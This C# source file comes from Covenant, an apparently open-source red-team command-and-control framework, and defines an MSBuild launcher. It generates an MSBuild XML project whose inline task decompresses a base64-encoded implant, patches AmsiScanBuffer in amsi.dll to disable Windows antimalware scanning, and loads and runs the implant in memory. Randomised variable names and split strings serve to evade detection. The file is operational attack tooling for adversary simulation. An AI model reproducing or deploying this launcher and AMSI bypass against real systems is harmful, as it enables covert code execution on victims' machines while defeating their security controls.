// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using System.Text;
using Covenant.Models.Grunts;
using Covenant.Models.Listeners;
using Microsoft.CodeAnalysis;
using System.Collections.Generic;

namespace Covenant.Models.Launchers
{
    public class MSBuildLauncher : DiskLauncher
    {
        public string TargetName = "TargetName";
        public string TaskName = "TaskName";

        // Variable names to be randomized for obfuscation
        public string random_var_patchAmsi;
        public string random_var_amsi;
        public List<String> random_var_amsi_dll;
        public List<String> random_var_amsiScanBuffer;
        public string random_var_outputMemoryStream;
        public string random_var_byteArray;
        public string random_var_read;
        public string random_var_deflateStream;
        public string random_var_lib;
        public string random_var_assemblyBuffer;


        public MSBuildLauncher()
        {
            this.Type = LauncherType.MSBuild;
            this.Description = "Uses msbuild.exe to launch a Grunt using an in-line task.";
            this.OutputKind = OutputKind.WindowsApplication;
            this.CompressStager = true;

            // Generate random strings for xml variable names
            this.random_var_patchAmsi = RandomString();
            this.random_var_amsi = RandomString();
            this.random_var_amsi_dll = new List<string>(new string[] { RandomString(), RandomString()});
            this.random_var_amsiScanBuffer = new List<string>(new string[] { RandomString(), RandomString(), RandomString() });
            this.random_var_outputMemoryStream = RandomString();
            this.random_var_byteArray = RandomString();
            this.random_var_read = RandomString();
            this.random_var_lib = RandomString();
            this.random_var_assemblyBuffer = RandomString();
            this.random_var_deflateStream = RandomString();
        }

        public override string GetFilename() => Utilities.GetSanitizedFilename(this.Name) + ".xml";

        public override string GetLauncherString(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
        {
            this.StagerCode = StagerCode;
            this.LauncherILBytes = StagerAssembly;
            string code = XMLTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", Convert.ToBase64String(this.LauncherILBytes));
            code = code.Replace("{{TARGET_NAME}}", this.TargetName);
            code = code.Replace("{{TASK_NAME}}", this.TaskName);
            this.DiskCode = Common.CovenantEncoding.GetBytes(code);

            // Replacements for obfuscation
            this.DiskCode = DiskCode.Replace("{{PATCH_AMSI}}", this.random_var_patchAmsi);
            this.DiskCode = DiskCode.Replace("{{AMSI}}", this.random_var_amsi);
            this.DiskCode = DiskCode.Replace("{{MEMORY_STREAM}}", this.random_var_outputMemoryStream);
            this.DiskCode = DiskCode.Replace("{{DEFLATE_STREAM}}", this.random_var_deflateStream);
            this.DiskCode = DiskCode.Replace("{{BYTE_ARRAY}}", this.random_var_byteArray);
            this.DiskCode = DiskCode.Replace("{{READ}}", this.random_var_read);
            this.DiskCode = DiskCode.Replace("{{LIB}}", this.random_var_lib);
            this.DiskCode = DiskCode.Replace("{{AMSI_DLL_0}}", this.random_var_amsi_dll[0]);
            this.DiskCode = DiskCode.Replace("{{AMSI_DLL_1}}", this.random_var_amsi_dll[1]);
            this.DiskCode = DiskCode.Replace("{{AMSI_SCAN_BUFF_0}}", this.random_var_amsiScanBuffer[0]);
            this.DiskCode = DiskCode.Replace("{{AMSI_SCAN_BUFF_1}}", this.random_var_amsiScanBuffer[1]);
            this.DiskCode = DiskCode.Replace("{{AMSI_SCAN_BUFF_2}}", this.random_var_amsiScanBuffer[2]);
            this.DiskCode = DiskCode.Replace("{{ASSEMBLY_BUFFER}}", this.random_var_assemblyBuffer);


            string launcher = "msbuild.exe" + " " + template.Name + ".xml";
            this.LauncherString = launcher;
            return this.LauncherString;
        }

        public override string GetHostedLauncherString(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
                string launcher = "msbuild.exe" + " " + hostedFile.Path.Split('/').Last();
                this.LauncherString = launcher;
                return launcher;
            }
            else { return ""; }
        }

        public string RandomString()
        {
            Random random = new Random();
            var stringBuilder = new StringBuilder(5);
            
            for (int i = 0; i < 5; i++)
            {
                var @char = (char)random.Next('a', 'a' + 26);
                stringBuilder.Append(@char);
            }

            return stringBuilder.ToString();
        }

        private static string XMLTemplate =
@"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
  <Target Name=""{{TARGET_NAME}}"">
    <{{TASK_NAME}}>
    </{{TASK_NAME}}>
  </Target>
  <UsingTask TaskName=""{{TASK_NAME}}"" TaskFactory=""CodeTaskFactory"" AssemblyFile=""C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"" >
    <ParameterGroup/>
    <Task>
      <Code Type=""Class"" Language=""cs"">
        <![CDATA[
        using System.Collections;
        using System.Collections.Generic;
        using System.Text;
        using System.Linq;
        using System.IO;
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class {{TASK_NAME}} :  Task, ITask
        { 
            [DllImport(""kernel32"")]
			public static extern IntPtr GetProcAddress(IntPtr hmod, string pn);

			[DllImport(""kernel32"")]
			public static extern IntPtr LoadLibrary(string n);

			[DllImport(""kernel32"")]
            public static extern bool VirtualProtect(IntPtr lpaddr, UIntPtr dws, uint flnp, out uint lpflop);

            public override bool Execute()
            {
                var {{MEMORY_STREAM}} = new System.IO.MemoryStream();
                var {{DEFLATE_STREAM}} = new System.IO.Compression.DeflateStream(new System.IO.MemoryStream(System.Convert.FromBase64String(""{{GRUNT_IL_BYTE_STRING}}"")), System.IO.Compression.CompressionMode.Decompress);
                var {{BYTE_ARRAY}} = new byte[1024];
                var {{READ}} = {{DEFLATE_STREAM}}.Read({{BYTE_ARRAY}}, 0, 1024);
            
                while ({{READ}} > 0)
                {
                    {{MEMORY_STREAM}}.Write({{BYTE_ARRAY}}, 0, {{READ}});
                    {{READ}} = {{DEFLATE_STREAM}}.Read({{BYTE_ARRAY}}, 0, 1024);
                }
			
                Bypass();
                var {{ASSEMBLY_BUFFER}} = System.Reflection.Assembly.Load({{MEMORY_STREAM}}.ToArray());
                var o = new object[] { new string[]{ } };
	            {{ASSEMBLY_BUFFER}}.EntryPoint.Invoke(0, o);
                return true;
            }
            

			public static void Bypass()
			{
                byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
			    byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

				if (is64Bit())
					{{PATCH_AMSI}}(x64);
				else
					{{PATCH_AMSI}}(x86);
			}

			private static void {{PATCH_AMSI}}(byte[] patch)
			{
				try
				{
					var {{AMSI_DLL_0}} = ""ams"";
					var {{AMSI_DLL_1}} = ""i.dll"";
					var {{LIB}} = LoadLibrary({{AMSI_DLL_0}} + {{AMSI_DLL_1}});
					var {{AMSI_SCAN_BUFF_0}} = ""Ams"";
					var {{AMSI_SCAN_BUFF_1}} = ""iSca"";
					var {{AMSI_SCAN_BUFF_2}} = ""nBuffer"";
					var addr = GetProcAddress({{LIB}}, {{AMSI_SCAN_BUFF_0}} + {{AMSI_SCAN_BUFF_1}} + {{AMSI_SCAN_BUFF_2}});

					uint oldProtect;
					VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

					Marshal.Copy(patch, 0, addr, patch.Length);
				}
				catch (Exception e)
				{
					Console.WriteLine("" [x] {0}"", e.Message);
					Console.WriteLine("" [x] {0}"", e.InnerException);
				}
			}

			private static bool is64Bit()
			{
				bool is64Bit = true;

				if (IntPtr.Size == 4)
					is64Bit = false;

				return is64Bit;
			}
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>";
    }
}
